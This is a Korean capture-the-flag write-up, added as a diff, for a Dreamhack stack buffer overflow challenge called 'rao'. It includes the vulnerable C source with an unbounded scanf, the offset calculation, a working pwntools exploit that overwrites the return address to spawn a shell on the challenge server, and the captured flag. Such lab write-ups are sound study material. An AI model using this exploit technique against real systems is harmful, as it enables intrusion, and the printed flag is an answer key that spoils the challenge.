@@ -1,0 +1,66 @@
+#과제 라이트업
+1. 문제 개요 및 목표
+- 문제 이름: Return Address Overwrite (rao)
+- 취약점 분류: 스택 버퍼 오버플로우 (Stack Buffer Overflow)
+- 목표: main 함수의 실행이 종료될 때, 정상적인 리턴 주소를 조작하여 셸을 실행해 주는 숨겨진 함수인 get_shell()로 흐름을 변조하고 원격 서버의 플래그(Flag)를 획득한다.
+
+2. 소스 코드 분석 (rao.c)
+#include <stdio.h>
+#include <unistd.h>
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+// [공격 타겟] 셸을 실행시켜 주는 핵심 함수
+void get_shell() {
+  char *cmd = "/bin/sh";
+  char *args[] = {cmd, NULL};
+  execve(cmd, args, NULL);
+}
+
+int main() {
+  char buf[0x28]; // 0x28 = 10진수로 40바이트 크기의 버퍼
+
+  init();
+
+  printf("Input: ");
+  scanf("%s", buf); // [취약점] 입력 크기 제한이 없어 오버플로우 발생
+
+  return 0;
+}
+- 취약점 식별: main 함수에서 buf 배열의 크기는 0x28(40바이트)로 선언되었습니다. 그러나 scanf("%s", buf) 구문은 사용자가 입력하는 데이터의 길이를 전혀 검증하지 않으므로, 40바이트 이상의 데이터를 입력하면 스택의 다른 중요한 데이터 영역까지 덮어쓰는 버퍼 오버플로우(BOF)가 발생합니다.
+
+- 공격 목표 주소: 정상적인 흐름에서는 호출되지 않는 get_shell() 함수가 존재하며, 이 함수는 내부적으로 리눅스 셸(/bin/sh)을 실행합니다. 따라서 이 함수의 메모리 주소로 리턴 주소를 변조해야 합니다.
+
+3. 스택 구조 및 거리 계산
+scanf를 통해 데이터가 입력되면 스택의 낮은 주소(buf)부터 높은 주소(RET) 방향으로 차례대로 채워집니다.
+따라서 RET 영역에 도달하기 전까지 의미 없는 값으로 채워야 하는 정확한 오프셋(Offset) 거리는 다음과 같습니다.
+
+offset = buf(40) + SFP(8) = 48byte
+
+4. 익스플로잇 스크립트 작성 
+from pwn import *
+
+p = remote("host3.dreamhack.games", 8527)
+
+get_shell_addr = 0x4006aa
+ret_gadget = 0x40072a  
+
+payload = b"A" * 48
+payload += p64(ret_gadget)        
+payload += p64(get_shell_addr)  
+
+p.recvuntil(b"Input: ")
+p.sendline(payload)
+
+print("[+] 공격 성공! 이제 아래에 ls를 입력해 보세요.")
+p.interactive()
+
+5. 플래그 휙득
+python ex.py 
+ls
+cat flag
+
+DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc} 휙득
